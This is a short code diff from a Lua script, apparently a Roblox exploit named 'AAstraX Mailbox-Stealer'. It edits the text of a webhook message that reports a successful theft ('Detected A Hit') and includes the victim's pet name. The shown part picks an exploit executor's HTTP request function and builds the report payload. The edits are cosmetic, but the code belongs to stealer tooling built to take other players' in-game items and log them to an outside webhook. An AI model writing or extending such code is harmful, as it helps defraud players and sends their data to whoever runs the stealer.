@@ -34,7 +34,7 @@ request = http_request or request or HttpPost or syn.request
 
 local data1 = {
 
-    ["content"] = "||lol Exclusive||\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging
+    ["content"] = "||Exclusive||\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging
 
     ["embeds"] = {
 
@@ -100,7 +100,7 @@ local data1 = {
 
                  
 
-                    ["name"] = "``` :money_mouth:  Exclusive :money_mouth: ```",
+                    ["name"] = " :money_mouth:  Exclusive :money_mouth: ",
 
                     ["value"] = "```>>> ".._G.PetName.."```",
 
